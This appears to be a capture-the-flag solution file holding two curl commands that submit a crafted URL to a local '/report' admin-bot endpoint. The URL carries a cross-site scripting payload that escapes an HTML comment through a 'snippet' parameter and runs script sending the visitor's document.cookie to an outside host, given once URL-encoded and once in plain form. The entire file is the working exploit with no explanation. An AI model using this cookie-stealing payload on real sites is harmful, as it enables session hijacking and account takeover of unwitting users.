# Snippets

```
curl http://localhost:3000/report --data-raw 'url=http%3A%2F%2F127.0.0.1%3A3000%2F%3Fname%3D--%253E%250Ax%3Dnew%2520Image()%3Bx.src%3D%2522https%3A%2F%2Fbawolff.net%3F%2522%252bencodeURI(document.cookie)%253C%252Fscript%253E%26snippet%3D%253Cdiv%2Btitle%253D%2522%253C!--%2B%253Cscript%253E%2F%2F%2522%253E'


curl http://localhost:1337/report --data-raw 'url=http://127.0.0.1:1337/?name=-->
x=new Image();x.src="https://bawolff.net?"+encodeURI(document.cookie)</script>&snippet=<div title="<!-- <script>//">'
```
